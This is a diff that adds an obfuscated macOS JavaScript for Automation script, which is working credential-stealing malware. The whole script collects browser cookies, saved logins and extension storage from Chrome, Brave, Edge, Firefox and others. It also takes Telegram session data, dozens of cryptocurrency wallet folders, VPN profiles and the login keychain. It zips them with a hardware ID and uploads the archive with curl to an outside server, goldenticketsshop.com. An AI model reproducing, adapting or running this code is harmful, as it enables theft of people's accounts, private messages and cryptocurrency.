@@ -1,0 +1,566 @@
+ObjC["import"]("Foundation");
+ObjC["import"]("stdlib");
+var a0_0x45177f = {
+  domain: "https://goldenticketsshop.com"
+};
+a0_0x45177f.endpoint = "/api/log";
+a0_0x45177f.curlFlags = "--retry 10 --retry-delay 10 --max-time 3600";
+const a0_0x493958 = {
+  'home': $.getenv("HOME").toString(),
+  'user': $.getenv("USER").toString()
+};
+a0_0x493958.lib = a0_0x493958.home + "/Library/";
+a0_0x493958.libAppSupport = a0_0x493958.lib + "Application Support/";
+a0_0x493958.keychain = a0_0x493958.home + "/Library/Keychains/login.keychain-db";
+a0_0x493958.telegram = a0_0x493958.libAppSupport + "Telegram Desktop/tdata";
+a0_0x493958.openvpn1 = a0_0x493958.libAppSupport + "OpenVPN Connect/profiles";
+a0_0x493958.openvpn2 = a0_0x493958.libAppSupport + "Tunnelblick/Configurations";
+a0_0x493958.openvpn3 = a0_0x493958.home + "/.openvpn";
+a0_0x493958.wallets = [a0_0x493958.home + "/.electrum/wallets", a0_0x493958.libAppSupport + "Coinomi/wallets", a0_0x493958.libAppSupport + "Exodus", a0_0x493958.libAppSupport + "atomic/Local Storage/leveldb", a0_0x493958.home + "/.walletwasabi/client/Wallets", a0_0x493958.libAppSupport + "Ledger Live", a0_0x493958.home + "/Monero/wallets", a0_0x493958.libAppSupport + "Bitcoin/wallets", a0_0x493958.libAppSupport + "Litecoin/wallets", a0_0x493958.libAppSupport + "DashCore/wallets", a0_0x493958.home + "/.electrum-ltc/wallets", a0_0x493958.home + "/.electron-cash/wallets", a0_0x493958.libAppSupport + "Guarda", a0_0x493958.libAppSupport + "Dogecoin/wallets", a0_0x493958.libAppSupport + "@trezor/suite-desktop", a0_0x493958.libAppSupport + "Binance/app-store.json", a0_0x493958.libAppSupport + "@tonkeeper/desktop/config.json"];
+var a0_0x278555 = {
+  name: "Chrome",
+  type: "chromium",
+  profilesPath: a0_0x493958.libAppSupport + "Google/Chrome/",
+  extractFiles: ["Cookies", "Network/Cookies", "Web Data", "Login Data", "Login Data For Account", "History", "Bookmarks"],
+  extractDirs: []
+};
+var a0_0x2f4ed3 = {
+  name: "Brave",
+  type: "chromium",
+  profilesPath: a0_0x493958.libAppSupport + "BraveSoftware/Brave-Browser/",
+  extractFiles: ["Cookies", "Network/Cookies", "Web Data", "Login Data", "Login Data For Account", "History", "Bookmarks"],
+  extractDirs: []
+};
+var a0_0x3e8bf6 = {
+  name: "Edge",
+  type: "chromium",
+  profilesPath: a0_0x493958.libAppSupport + "Microsoft Edge/",
+  extractFiles: ["Cookies", "Network/Cookies", "Web Data", "Login Data", "Login Data For Account", "History", "Bookmarks"],
+  extractDirs: []
+};
+var a0_0x4d93cf = {
+  name: "Vivaldi",
+  type: "chromium",
+  profilesPath: a0_0x493958.libAppSupport + "Vivaldi/",
+  extractFiles: ["Cookies", "Network/Cookies", "Web Data", "Login Data", "Login Data For Account", "History", "Bookmarks"],
+  extractDirs: []
+};
+var a0_0x165fc0 = {
+  name: "Opera",
+  type: "chromium",
+  profilesPath: a0_0x493958.libAppSupport + "com.operasoftware.Opera/",
+  extractFiles: ["Cookies", "Network/Cookies", "Web Data", "Login Data", "Login Data For Account", "History", "Bookmarks"],
+  extractDirs: []
+};
+var a0_0x92a53e = {
+  name: "OperaGX",
+  type: "chromium",
+  profilesPath: a0_0x493958.libAppSupport + "com.operasoftware.OperaGX/",
+  extractFiles: ["Cookies", "Network/Cookies", "Web Data", "Login Data", "Login Data For Account", "History", "Bookmarks"],
+  extractDirs: []
+};
+var a0_0x29cd9f = {
+  name: "Chrome Beta",
+  type: "chromium",
+  profilesPath: a0_0x493958.libAppSupport + "Google/Chrome Beta/",
+  extractFiles: ["Cookies", "Network/Cookies", "Web Data", "Login Data", "Login Data For Account", "History", "Bookmarks"],
+  extractDirs: []
+};
+var a0_0x11dd4f = {
+  name: "Chrome Canary"
+};
+a0_0x11dd4f.type = "chromium";
+a0_0x11dd4f.profilesPath = a0_0x493958.libAppSupport + "Google/Chrome Canary/";
+a0_0x11dd4f.extractFiles = ["Cookies", "Network/Cookies", "Web Data", "Login Data", "Login Data For Account", "History", "Bookmarks"];
+a0_0x11dd4f.extractDirs = [];
+var a0_0x3053eb = {
+  name: "Chromium",
+  type: "chromium",
+  profilesPath: a0_0x493958.libAppSupport + "Chromium/",
+  extractFiles: ["Cookies", "Network/Cookies", "Web Data", "Login Data", "Login Data For Account", "History", "Bookmarks"],
+  extractDirs: []
+};
+var a0_0x55e0dd = {
+  name: "Chrome Dev",
+  type: "chromium",
+  profilesPath: a0_0x493958.libAppSupport + "Google/Chrome Dev/",
+  extractFiles: ["Cookies", "Network/Cookies", "Web Data", "Login Data", "Login Data For Account", "History", "Bookmarks"],
+  extractDirs: []
+};
+var a0_0xef97ca = {
+  name: "Arc",
+  type: "chromium",
+  profilesPath: a0_0x493958.libAppSupport + "Arc/",
+  extractFiles: ["Cookies", "Network/Cookies", "Web Data", "Login Data", "Login Data For Account", "History", "Bookmarks"],
+  extractDirs: []
+};
+var a0_0xea9cba = {
+  name: "Coccoc",
+  type: "chromium",
+  profilesPath: a0_0x493958.libAppSupport + "Coccoc/",
+  extractFiles: ["Cookies", "Network/Cookies", "Web Data", "Login Data", "Login Data For Account", "History", "Bookmarks"],
+  extractDirs: []
+};
+var a0_0x15d090 = {
+  name: "Firefox",
+  type: "firefox",
+  profilesPath: a0_0x493958.libAppSupport + "Firefox/Profiles/",
+  extractFiles: ["cookies.sqlite", "formhistory.sqlite", "key4.db", "logins.json", "extensions.json", "prefs.js", "places.sqlite"],
+  extractDirs: []
+};
+var a0_0xca561a = {
+  name: "Waterfox",
+  type: "firefox",
+  profilesPath: a0_0x493958.libAppSupport + "Waterfox/Profiles/",
+  extractFiles: ["cookies.sqlite", "formhistory.sqlite", "key4.db", "logins.json", "extensions.json", "prefs.js", "places.sqlite"],
+  extractDirs: []
+};
+var a0_0x2e1009 = {
+  name: "Pale Moon",
+  type: "firefox",
+  profilesPath: a0_0x493958.libAppSupport + "Pale Moon/Profiles/",
+  extractFiles: ["cookies.sqlite", "formhistory.sqlite", "key4.db", "logins.json", "extensions.json", "prefs.js", "places.sqlite"],
+  extractDirs: []
+};
+const a0_0x40a812 = [a0_0x278555, a0_0x2f4ed3, a0_0x3e8bf6, a0_0x4d93cf, a0_0x165fc0, a0_0x92a53e, a0_0x29cd9f, a0_0x11dd4f, a0_0x3053eb, a0_0x55e0dd, a0_0xef97ca, a0_0xea9cba, a0_0x15d090, a0_0xca561a, a0_0x2e1009];
+const a0_0x33b813 = {
+  'shellEscape'(_0x3b729f) {
+    return "\"" + String(_0x3b729f).replace(/(["$`\\])/g, "\\$1") + "\"";
+  },
+  'sanitizeFileName'(_0xb50b8e) {
+    try {
+      const _0x48fad2 = typeof _0xb50b8e === "string" ? _0xb50b8e : ObjC.unwrap($(_0xb50b8e).description);
+      return _0x48fad2.replace(/[^\w\s]/g, " ").replace(/\s+/g, " ").trim();
+    } catch (_0x18770c) {
+      return '';
+    }
+  },
+  'fileExists'(_0x3ef6fc) {
+    var _0x40fc92 = Ref();
+    return $.NSFileManager.defaultManager.fileExistsAtPathIsDirectory($(_0x3ef6fc), _0x40fc92);
+  },
+  'isDirectory'(_0xc2f26b) {
+    var _0x538417 = Ref();
+    $.NSFileManager.defaultManager.fileExistsAtPathIsDirectory($(_0xc2f26b), _0x538417);
+    return _0x538417[0x0];
+  },
+  'pathExists'(_0x1a3fc7) {
+    var _0x4b0ef4 = _0x1a3fc7.replace(/\/$/, '');
+    var _0x40cffb = Ref();
+    return $.NSFileManager.defaultManager.fileExistsAtPathIsDirectory($(_0x4b0ef4), _0x40cffb);
+  },
+  'directoryExists'(_0x44f4a2) {
+    var _0x284da4 = Ref();
+    return $.NSFileManager.defaultManager.fileExistsAtPathIsDirectory($(_0x44f4a2), _0x284da4) && _0x284da4[0x0];
+  },
+  'createDirectory'(_0x238293) {
+    a0_0x2e67dc.doShellScript("mkdir -p " + this.shellEscape(_0x238293));
+  },
+  'copyFile'(_0x26e2b3, _0x29f4cd) {
+    var _0x1b08ad = _0x29f4cd.split('/').slice(0x0, -0x1).join('/');
+    this.createDirectory(_0x1b08ad);
+    a0_0x2e67dc.doShellScript("cp " + this.shellEscape(_0x26e2b3) + " " + this.shellEscape(_0x29f4cd));
+  },
+  'copyDirectory'(_0x4efead, _0x5b9b3f) {
+    this.createDirectory(_0x5b9b3f);
+    a0_0x2e67dc.doShellScript("cp -R " + this.shellEscape(_0x4efead) + "/. " + this.shellEscape(_0x5b9b3f) + '/');
+  },
+  'getDirectoryContents'(_0x202f54) {
+    var _0x35d3c3 = $.NSFileManager.defaultManager;
+    var _0x4fe865 = _0x35d3c3.contentsOfDirectoryAtPathError($(_0x202f54).stringByStandardizingPath, null);
+    if (!_0x4fe865 || _0x4fe865.isKindOfClass($.NSNull)) {
+      return [];
+    }
+    return ObjC.unwrap(_0x4fe865).map(function (_0x4a1993) {
+      return ObjC.unwrap(_0x4a1993);
+    });
+  },
+  'getRelativePathFromHome'(_0x1dea98, _0x1b2713) {
+    if (_0x1dea98.indexOf(_0x1b2713) === 0x0) {
+      var _0x4cbaf8 = _0x1dea98.substring(_0x1b2713.length);
+      if (_0x4cbaf8.charAt(0x0) === '/') {
+        _0x4cbaf8 = _0x4cbaf8.substring(0x1);
+      }
+      return _0x4cbaf8;
+    }
+    return _0x1dea98;
+  }
+};
+const a0_0x387445 = {
+  'resolveTitle'(_0x477ad1, _0x1dc252, _0x27f3b8, _0x494755) {
+    var _0x4c2e83 = _0x477ad1.match(/^__MSG_(\w+)__$/);
+    if (!_0x4c2e83) {
+      return _0x477ad1;
+    }
+    var _0x1a161a = ObjC.unwrap(_0x1dc252.objectForKey("default_locale"));
+    if (!_0x1a161a) {
+      return _0x477ad1;
+    }
+    var _0xc8667a = $(_0x27f3b8).stringByAppendingPathComponent("_locales");
+    var _0x13f556 = $(_0xc8667a).stringByAppendingPathComponent(_0x1a161a + "/messages.json");
+    if (!_0x494755.fileExistsAtPath(_0x13f556)) {
+      return _0x477ad1;
+    }
+    try {
+      var _0x5dde5c = $.NSData.dataWithContentsOfFile(_0x13f556);
+      var _0x25c65e = $.NSJSONSerialization.JSONObjectWithDataOptionsError(_0x5dde5c, 0x0, null);
+      var _0x59f76d = _0x25c65e.objectForKey(_0x4c2e83[0x1]);
+      if (_0x59f76d) {
+        return ObjC.unwrap(_0x59f76d.objectForKey("message"));
+      }
+    } catch (_0x3b44e8) {}
+    return _0x477ad1;
+  },
+  'extractExtensionName'(_0x58f666, _0x1ded7e) {
+    var _0x24f0db = $.NSFileManager.defaultManager;
+    var _0x16767a = ObjC.unwrap(_0x58f666.objectForKey("default_title"));
+    if (_0x16767a) {
+      var _0x594951 = this.resolveTitle(_0x16767a, _0x58f666, _0x1ded7e, _0x24f0db);
+      if (_0x594951 && _0x594951 !== _0x16767a) {
+        return a0_0x33b813.sanitizeFileName(_0x594951);
+      }
+    }
+    var _0x3f666f = ObjC.unwrap(_0x58f666.objectForKey("name"));
+    if (_0x3f666f) {
+      var _0xa73429 = this.resolveTitle(_0x3f666f, _0x58f666, _0x1ded7e, _0x24f0db);
+      if (_0xa73429 && _0xa73429 !== _0x3f666f) {
+        return a0_0x33b813.sanitizeFileName(_0xa73429);
+      }
+      return a0_0x33b813.sanitizeFileName(_0x3f666f);
+    }
+    return "Unknown";
+  },
+  'getSortedVersions'(_0x50b556) {
+    var _0x2c5bc4 = $.NSFileManager.defaultManager;
+    try {
+      var _0x268d26 = _0x2c5bc4.contentsOfDirectoryAtURLIncludingPropertiesForKeysOptionsError($.NSURL.fileURLWithPath(_0x50b556), [], 0x0, null);
+      var _0x2c23a1 = ObjC.unwrap(_0x268d26) || [];
+      return _0x2c23a1.sort(function (_0x2d09f8, _0x20b2a8) {
+        return ObjC.unwrap(_0x20b2a8.lastPathComponent).localeCompare(ObjC.unwrap(_0x2d09f8.lastPathComponent));
+      });
+    } catch (_0x1a012f) {
+      return [];
+    }
+  },
+  'readManifest'(_0x9e9e6) {
+    var _0xb260b9 = $.NSFileManager.defaultManager;
+    var _0x3015e5 = $(_0x9e9e6).stringByAppendingPathComponent("manifest.json");
+    if (!_0xb260b9.fileExistsAtPath(_0x3015e5)) {
+      return null;
+    }
+    try {
+      var _0x1d63f6 = $.NSData.dataWithContentsOfFile(_0x3015e5);
+      return $.NSJSONSerialization.JSONObjectWithDataOptionsError(_0x1d63f6, 0x0, null);
+    } catch (_0x207344) {
+      return null;
+    }
+  },
+  'getExtensionName'(_0x37b739, _0x38bde3) {
+    var _0x1c446f = $.NSFileManager.defaultManager;
+    var _0x34f04c = _0x38bde3.URLByAppendingPathComponent(_0x37b739).path;
+    if (!_0x1c446f.fileExistsAtPath(_0x34f04c)) {
+      return "Unknown";
+    }
+    var _0x535a06 = this.getSortedVersions(_0x34f04c);
+    if (_0x535a06.length === 0x0) {
+      return "Unknown";
+    }
+    var _0x2ed134 = _0x535a06[0x0].path;
+    var _0x53da16 = this.readManifest(_0x2ed134);
+    if (!_0x53da16) {
+      return "Unknown";
+    }
+    return this.extractExtensionName(_0x53da16, _0x2ed134);
+  },
+  'extractExtensions'(_0x4da2ec, _0x5ad629) {
+    var _0x451b0a = _0x4da2ec + "Local Extension Settings/";
+    if (!a0_0x33b813.directoryExists(_0x451b0a)) {
+      return;
+    }
+    var _0x3a4fb7 = a0_0x33b813.getDirectoryContents(_0x451b0a);
+    if (_0x3a4fb7.length === 0x0) {
+      return;
+    }
+    var _0x964a41 = $.NSURL.fileURLWithPath(_0x4da2ec + "Extensions/");
+    var _0x2b5495 = _0x5ad629 + "Local Extension Settings/";
+    for (var _0xff6915 = 0x0; _0xff6915 < _0x3a4fb7.length; _0xff6915++) {
+      var _0x38f531 = _0x3a4fb7[_0xff6915];
+      var _0x593c94 = this.getExtensionName(_0x38f531, _0x964a41);
+      var _0x420442 = _0x2b5495 + _0x593c94;
+      a0_0x33b813.createDirectory(_0x420442);
+      var _0x244185 = _0x451b0a + _0x38f531;
+      var _0x5981ef = _0x420442 + '/' + _0x38f531;
+      if (a0_0x33b813.directoryExists(_0x244185)) {
+        a0_0x33b813.copyDirectory(_0x244185, _0x5981ef);
+      }
+    }
+  }
+};
+const a0_0x3cadc7 = {
+  'parsePrefsFile'(_0x224d86) {
+    var _0x4ac776 = _0x224d86 + "prefs.js";
+    if (!a0_0x33b813.fileExists(_0x4ac776)) {
+      return {};
+    }
+    var _0xcba729 = $.NSString.stringWithContentsOfFileEncodingError($(_0x4ac776), $.NSUTF8StringEncoding, null);
+    if (!_0xcba729) {
+      return {};
+    }
+    var _0x2384de = ObjC.unwrap(_0xcba729).split("\n");
+    var _0x1dc4f3 = null;
+    for (var _0x12d453 = 0x0; _0x12d453 < _0x2384de.length; _0x12d453++) {
+      if (_0x2384de[_0x12d453].indexOf("user_pref(\"extensions.webextensions.uuids\"") !== -0x1) {
+        _0x1dc4f3 = _0x2384de[_0x12d453];
+        break;
+      }
+    }
+    if (!_0x1dc4f3) {
+      return {};
+    }
+    var _0x33bff0 = _0x1dc4f3.match(/user_pref\("extensions\.webextensions\.uuids",\s*(".*")\);/);
+    if (!_0x33bff0) {
+      return {};
+    }
+    try {
+      var _0x323f33 = _0x33bff0[0x1];
+      var _0x4b08e8 = JSON.parse(JSON.parse(_0x323f33));
+      var _0xcaf696 = {};
+      for (var _0x4f3ec2 in _0x4b08e8) {
+        if (_0x4b08e8.hasOwnProperty(_0x4f3ec2)) {
+          _0xcaf696[_0x4b08e8[_0x4f3ec2]] = _0x4f3ec2;
+        }
+      }
+      return _0xcaf696;
+    } catch (_0x42240b) {
+      return {};
+    }
+  },
+  'parseExtensionsJSON'(_0x4ee353) {
+    var _0x111a68 = _0x4ee353 + "extensions.json";
+    if (!a0_0x33b813.fileExists(_0x111a68)) {
+      return {};
+    }
+    try {
+      var _0x7692db = $.NSData.dataWithContentsOfFile($(_0x111a68));
+      var _0x381f17 = ObjC.unwrap($.NSString.alloc.initWithDataEncoding(_0x7692db, $.NSUTF8StringEncoding));
+      return JSON.parse(_0x381f17);
+    } catch (_0x1409bc) {
+      return {};
+    }
+  },
+  'getExtensionName'(_0x108f46, _0xc1c2e9) {
+    try {
+      if (!_0xc1c2e9.addons || !Array.isArray(_0xc1c2e9.addons)) {
+        return null;
+      }
+      for (var _0x206dc6 = 0x0; _0x206dc6 < _0xc1c2e9.addons.length; _0x206dc6++) {
+        var _0x1d7a7c = _0xc1c2e9.addons[_0x206dc6];
+        if (_0x1d7a7c.id === _0x108f46) {
+          if (_0x1d7a7c.defaultLocale && _0x1d7a7c.defaultLocale.name) {
+            var _0x17aead = a0_0x33b813.sanitizeFileName(_0x1d7a7c.defaultLocale.name);
+            if (_0x17aead) {
+              return _0x17aead;
+            }
+          }
+          break;
+        }
+      }
+    } catch (_0x467eae) {}
+    return null;
+  },
+  'findExtensionUUIDs'(_0x3c4e94) {
+    var _0x451dbb = _0x3c4e94 + "storage/default/";
+    if (!a0_0x33b813.directoryExists(_0x451dbb)) {
+      return [];
+    }
+    var _0x5d2ac1 = a0_0x33b813.getDirectoryContents(_0x451dbb);
+    var _0x178337 = [];
+    for (var _0x37fab8 = 0x0; _0x37fab8 < _0x5d2ac1.length; _0x37fab8++) {
+      var _0x25b901 = _0x5d2ac1[_0x37fab8];
+      if (_0x25b901.indexOf("moz-extension+++") === 0x0 && _0x25b901.indexOf('^') === -0x1) {
+        _0x178337.push(_0x25b901);
+      }
+    }
+    return _0x178337;
+  },
+  'extractExtensions'(_0x591824, _0x2a4814) {
+    var _0x52eabd = this.findExtensionUUIDs(_0x591824);
+    if (_0x52eabd.length === 0x0) {
+      return;
+    }
+    var _0x310d86 = this.parsePrefsFile(_0x591824);
+    var _0x1642a5 = this.parseExtensionsJSON(_0x591824);
+    var _0x30f099 = _0x2a4814 + "extensions/";
+    for (var _0x29de0e = 0x0; _0x29de0e < _0x52eabd.length; _0x29de0e++) {
+      var _0x3d1fd6 = _0x52eabd[_0x29de0e];
+      var _0x4b0418 = _0x3d1fd6.replace("moz-extension+++", '');
+      var _0x33c8cd = _0x310d86[_0x4b0418];
+      var _0x1c6cc6 = "Unknown";
+      var _0x1ee12d = _0x3d1fd6;
+      if (_0x33c8cd) {
+        _0x1ee12d = _0x33c8cd;
+        var _0x3136df = this.getExtensionName(_0x33c8cd, _0x1642a5);
+        if (_0x3136df) {
+          _0x1c6cc6 = _0x3136df;
+        }
+      }
+      var _0x4f0726 = _0x30f099 + _0x1c6cc6;
+      a0_0x33b813.createDirectory(_0x4f0726);
+      var _0x3db751 = _0x591824 + "storage/default/" + _0x3d1fd6;
+      var _0x545ecf = _0x4f0726 + '/' + _0x1ee12d;
+      if (a0_0x33b813.directoryExists(_0x3db751)) {
+        a0_0x33b813.copyDirectory(_0x3db751, _0x545ecf);
+      }
+    }
+  }
+};
+const a0_0x34e685 = {
+  'enumerateProfiles'(_0x11f828) {
+    if (!a0_0x33b813.directoryExists(_0x11f828.profilesPath)) {
+      return [];
+    }
+    var _0x3367ac = a0_0x33b813.getDirectoryContents(_0x11f828.profilesPath);
+    var _0x3ae6ac = [];
+    for (var _0x13e6f1 = 0x0; _0x13e6f1 < _0x3367ac.length; _0x13e6f1++) {
+      var _0x25dbf4 = _0x3367ac[_0x13e6f1];
+      var _0x44fb8e = _0x11f828.profilesPath + _0x25dbf4;
+      if (a0_0x33b813.directoryExists(_0x44fb8e)) {
+        _0x3ae6ac.push(_0x25dbf4);
+      }
+    }
+    return _0x3ae6ac;
+  },
+  'extractProfileData'(_0x3735f0, _0x47557c, _0x5beb43, _0x54ea55) {
+    var _0x25d9a2 = _0x3735f0.profilesPath + _0x47557c + '/';
+    var _0x481cf7 = _0x3735f0.profilesPath.replace(_0x54ea55 + "/Library/Application Support/", '') + _0x47557c + '/';
+    var _0x5a30ca = _0x5beb43 + _0x481cf7;
+    for (var _0x4cca94 = 0x0; _0x4cca94 < _0x3735f0.extractFiles.length; _0x4cca94++) {
+      var _0x31b042 = _0x3735f0.extractFiles[_0x4cca94];
+      var _0x31cee4 = _0x25d9a2 + _0x31b042;
+      var _0x15d6c1 = _0x5a30ca + _0x31b042;
+      if (a0_0x33b813.pathExists(_0x31cee4)) {
+        a0_0x33b813.copyFile(_0x31cee4, _0x15d6c1);
+      }
+    }
+    if (_0x3735f0.type === "firefox") {
+      a0_0x3cadc7.extractExtensions(_0x25d9a2, _0x5a30ca);
+    } else if (_0x3735f0.type === "chromium") {
+      a0_0x387445.extractExtensions(_0x25d9a2, _0x5a30ca);
+    }
+  },
+  'extract'(_0x334c4a, _0x17d92f, _0x50a3db) {
+    a0_0x33b813.createDirectory(_0x17d92f);
+    for (var _0x3128fd = 0x0; _0x3128fd < _0x334c4a.length; _0x3128fd++) {
+      var _0x17fcaf = _0x334c4a[_0x3128fd];
+      var _0x5ac6c0 = this.enumerateProfiles(_0x17fcaf);
+      if (_0x5ac6c0.length === 0x0) {
+        continue;
+      }
+      for (var _0x42be7d = 0x0; _0x42be7d < _0x5ac6c0.length; _0x42be7d++) {
+        this.extractProfileData(_0x17fcaf, _0x5ac6c0[_0x42be7d], _0x17d92f, _0x50a3db);
+      }
+    }
+  }
+};
+const a0_0x21a26b = {
+  'extract'(_0x392894, _0x39305e) {
+    if (a0_0x33b813.fileExists(_0x392894)) {
+      a0_0x33b813.copyFile(_0x392894, _0x39305e);
+    }
+  }
+};
+const a0_0x36b09b = {
+  'extractTelegram'(_0x20542e, _0x52ca11) {
+    var _0x5824e3 = _0x20542e + "/Library/Application Support/Telegram Desktop/tdata";
+    var _0x45d68f = _0x52ca11 + "Messengers/Telegram/tdata";
+    if (!a0_0x33b813.directoryExists(_0x5824e3)) {
+      return;
+    }
+    a0_0x33b813.createDirectory(_0x45d68f);
+    var _0x3f67fc = a0_0x33b813.getDirectoryContents(_0x5824e3);
+    for (var _0x5c9c1d = 0x0; _0x5c9c1d < _0x3f67fc.length; _0x5c9c1d++) {
+      var _0x1e9f2c = _0x3f67fc[_0x5c9c1d];
+      var _0xf2712c = _0x5824e3 + '/' + _0x1e9f2c;
+      var _0x5d8709 = _0x45d68f + '/' + _0x1e9f2c;
+      if (/^[0-9A-F]{16}$/.test(_0x1e9f2c) || /^[0-9A-F]{16}s$/.test(_0x1e9f2c) || _0x1e9f2c === "key_datas") {
+        if (a0_0x33b813.directoryExists(_0xf2712c)) {
+          a0_0x33b813.copyDirectory(_0xf2712c, _0x5d8709);
+        } else if (a0_0x33b813.fileExists(_0xf2712c)) {
+          a0_0x33b813.copyFile(_0xf2712c, _0x5d8709);
+        }
+      }
+    }
+  },
+  'extract'(_0x1441c7, _0x697eb0) {
+    this.extractTelegram(_0x1441c7, _0x697eb0);
+  }
+};
+const a0_0x64257d = {
+  'extract'(_0xcb22db, _0x525acf, _0x93fdc5) {
+    var _0x4c5a62 = false;
+    var _0x8de0e7 = _0x525acf + "Wallets/";
+    for (var _0x532e74 = 0x0; _0x532e74 < _0xcb22db.length; _0x532e74++) {
+      var _0x1478c3 = _0xcb22db[_0x532e74];
+      try {
+        if (a0_0x33b813.directoryExists(_0x1478c3) || a0_0x33b813.fileExists(_0x1478c3)) {
+          if (!_0x4c5a62) {
+            a0_0x33b813.createDirectory(_0x8de0e7);
+            _0x4c5a62 = true;
+          }
+          var _0x7c3cd9 = _0x1478c3.replace(_0x93fdc5 + '/', '');
+          var _0x26fb71 = _0x8de0e7 + _0x7c3cd9;
+          if (a0_0x33b813.directoryExists(_0x1478c3)) {
+            a0_0x33b813.copyDirectory(_0x1478c3, _0x26fb71);
+          } else {
+            a0_0x33b813.copyFile(_0x1478c3, _0x26fb71);
+          }
+        }
+      } catch (_0x4d3cc5) {}
+    }
+  }
+};
+const a0_0xb98c8 = {
+  'extract'(_0x634ec4, _0x224577) {
+    var _0x55ebf0 = false;
+    var _0x5ed2bb = _0x634ec4 + "VPN/";
+    var _0x10175e = [a0_0x493958.openvpn1, a0_0x493958.openvpn2, a0_0x493958.openvpn3];
+    for (var _0x11144b = 0x0; _0x11144b < _0x10175e.length; _0x11144b++) {
+      var _0x595d6c = _0x10175e[_0x11144b];
+      try {
+        if (a0_0x33b813.directoryExists(_0x595d6c) || a0_0x33b813.fileExists(_0x595d6c)) {
+          if (!_0x55ebf0) {
+            a0_0x33b813.createDirectory(_0x5ed2bb);
+            _0x55ebf0 = true;
+          }
+          var _0x4e45f6 = _0x595d6c.replace(_0x224577 + '/', '');
+          var _0x5257ad = _0x5ed2bb + _0x4e45f6;
+          if (a0_0x33b813.directoryExists(_0x595d6c)) {
+            a0_0x33b813.copyDirectory(_0x595d6c, _0x5257ad);
+          } else {
+            a0_0x33b813.copyFile(_0x595d6c, _0x5257ad);
+          }
+        }
+      } catch (_0x24e316) {}
+    }
+  }
+};
+var a0_0x2e67dc = Application.currentApplication();
+a0_0x2e67dc.includeStandardAdditions = true;
+var a0_0x25ece1 = a0_0x2e67dc.doShellScript("uuidgen").replace(/\s+$/, '');
+var a0_0x12ca16 = a0_0x2e67dc.doShellScript("md5 -q -s \"" + a0_0x25ece1 + "\"").replace(/\s+$/, '');
+var a0_0x4203c0 = "/tmp/" + a0_0x12ca16 + '/';
+a0_0x33b813.createDirectory(a0_0x4203c0);
+a0_0x34e685.extract(a0_0x40a812, a0_0x4203c0 + "Application Support/", a0_0x493958.home);
+a0_0x36b09b.extract(a0_0x493958.home, a0_0x4203c0);
+a0_0x64257d.extract(a0_0x493958.wallets, a0_0x4203c0, a0_0x493958.home);
+a0_0xb98c8.extract(a0_0x4203c0, a0_0x493958.home);
+a0_0x21a26b.extract(a0_0x493958.keychain, a0_0x4203c0 + "Library/Keychains/login.keychain-db");
+var a0_0x5e0a1b = "/tmp/" + a0_0x12ca16 + ".zip";
+a0_0x2e67dc.doShellScript("cd /tmp; zip -r -y --quiet " + ("\"" + String(a0_0x5e0a1b).replace(/(["$`\\])/g, "\\$1") + "\"") + " " + ("\"" + String(a0_0x12ca16).replace(/(["$`\\])/g, "\\$1") + "\"") + " 2>/dev/null");
+a0_0x2e67dc.doShellScript("rm -rf \"" + a0_0x4203c0 + "\"");
+var a0_0x8abc42 = a0_0x2e67dc.doShellScript("system_profiler SPHardwareDataType | awk -F': ' '/Hardware UUID/ {print $2}' | md5").replace(/\s+$/, '');
+var a0_0x227d4f = $.getenv("USER").toString();
+var a0_0x49acba = a0_0x2e67dc.doShellScript("tail -n 1 /tmp/wid.txt").replace(/\s+$/, '');
+var a0_0x548f64 = "curl " + a0_0x45177f.curlFlags + " -F 'file=@" + a0_0x5e0a1b + "'" + " -F 'hwid=" + a0_0x8abc42 + "'" + " -F 'wid=" + a0_0x49acba + "'" + " -F 'user=" + a0_0x227d4f + "'" + " \"" + "https://goldenticketsshop.com" + a0_0x45177f.endpoint + "\"";
+a0_0x2e67dc.doShellScript(a0_0x548f64);
+
